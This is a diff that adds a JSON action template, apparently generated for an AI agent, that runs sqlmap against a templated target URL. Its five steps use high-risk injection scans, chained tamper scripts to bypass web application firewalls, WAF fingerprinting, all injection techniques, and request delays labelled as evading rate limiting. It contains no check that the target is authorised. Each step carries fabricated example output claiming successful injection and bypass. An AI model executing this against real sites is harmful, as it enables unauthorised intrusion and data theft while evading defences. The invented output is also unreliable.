@@ -1,0 +1,30 @@
+{
+  "name": "sqlmap_advanced_options",
+  "description": "Advanced sqlmap features including tamper scripts, risk levels, and WAF bypass techniques",
+  "pattern": "sqlmap.*tamper|sqlmap.*waf|sqlmap.*risk|sqlmap.*level|bypass.*waf",
+  "parameters": ["target_url", "tamper_script", "risk_level", "level"],
+  "sequence": [
+    {
+      "action": {"type": "system_command", "tool": "shell", "operation": "run", "command": "sqlmap", "args": ["-u", "{{target_url}}", "--tamper=space2comment", "--risk=3", "--level=5", "--batch"]},
+      "expected_output": {"type": "string", "example": "[15:40:10] [INFO] testing connection to the target URL\n[15:40:11] [INFO] testing if the target URL content is stable\n[15:40:12] [INFO] using tamper script 'space2comment'\n[15:40:13] [INFO] testing 'MySQL >= 5.0 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)'\n[15:40:14] [INFO] original value: id=1 OR 1=1\n[15:40:14] [INFO] tampered to: id=1/**/OR/**/1=1\n[15:40:18] [INFO] GET parameter 'id' is 'MySQL >= 5.0 AND error-based' injectable\n[15:40:19] [INFO] testing 'MySQL >= 5.0 error-based - Parameter replace (FLOOR)'\ninjection point found with high-risk payloads"}
+    },
+    {
+      "action": {"type": "system_command", "tool": "shell", "operation": "run", "command": "sqlmap", "args": ["-u", "{{target_url}}", "--tamper=between,randomcase,space2comment", "--random-agent", "--batch"]},
+      "expected_output": {"type": "string", "example": "[15:41:30] [INFO] loading tamper module 'between'\n[15:41:31] [INFO] loading tamper module 'randomcase'\n[15:41:32] [INFO] loading tamper module 'space2comment'\n[15:41:33] [INFO] fetched random HTTP User-Agent header value 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'\n[15:41:35] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause'\n[15:41:36] [INFO] original: SELECT * FROM users WHERE id=1 AND 1=1\n[15:41:36] [INFO] tampered: SELECT * FROM users WHERE id=1/**/AnD/**/1 BETWEEN 0 AND 2\n[15:41:40] [INFO] GET parameter 'id' appears to be 'AND boolean-based blind' injectable\nWAF bypass successful with tamper scripts"}
+    },
+    {
+      "action": {"type": "system_command", "tool": "shell", "operation": "run", "command": "sqlmap", "args": ["-u", "{{target_url}}", "--identify-waf", "--batch"]},
+      "expected_output": {"type": "string", "example": "[15:42:50] [INFO] testing connection to the target URL\n[15:42:51] [INFO] checking if the target is protected by some kind of WAF/IPS\n[15:42:53] [INFO] heuristics detected web page charset 'utf-8'\n[15:42:55] [WARNING] WAF/IPS identified as 'ModSecurity (Trustwave)'\n[15:42:56] [INFO] testing if the target URL content is stable\ndetected WAF: ModSecurity\nrecommended tampers: modsecurityversioned, modsecurityzeroversioned"}
+    },
+    {
+      "action": {"type": "system_command", "tool": "shell", "operation": "run", "command": "bash", "args": ["-c", "sqlmap -u '{{target_url}}' --technique=BEUSTQ --threads=10 --batch 2>&1 | grep -E 'injectable|payload'"]},
+      "expected_output": {"type": "string", "example": "[15:43:20] [INFO] testing 'Boolean-based blind - Parameter replace'\n[15:43:21] [INFO] testing 'Error-based queries'\n[15:43:22] [INFO] testing 'Union query-based'\n[15:43:23] [INFO] testing 'Stacked queries'\n[15:43:24] [INFO] testing 'Time-based blind'\n[15:43:25] [INFO] testing 'Query-based'\n[15:43:30] [INFO] GET parameter 'id' is 'MySQL >= 5.0.12 AND time-based blind' injectable\n[15:43:35] [INFO] GET parameter 'id' is 'Generic UNION query (NULL) - 5 columns' injectable"}
+    },
+    {
+      "action": {"type": "system_command", "tool": "shell", "operation": "run", "command": "sqlmap", "args": ["-u", "{{target_url}}", "--delay=2", "--timeout=30", "--retries=3", "--batch"]},
+      "expected_output": {"type": "string", "example": "[15:44:40] [INFO] setting delay between requests to 2 seconds\n[15:44:41] [INFO] setting timeout to 30 seconds\n[15:44:42] [INFO] setting maximum number of retries to 3\n[15:44:43] [INFO] testing connection to the target URL\n[15:44:45] [INFO] target URL content is stable (delay applied)\n[15:44:47] [INFO] testing if GET parameter 'id' is dynamic\n[15:44:50] [INFO] GET parameter 'id' appears to be dynamic\nstealthy scan mode active - evading rate limiting"}
+    }
+  ],
+  "stats": {"uses": 0, "successes": 0, "failures": 0, "success_rate": 0.0},
+  "created_by": "neural_mesh_v5.2_generator"
+}
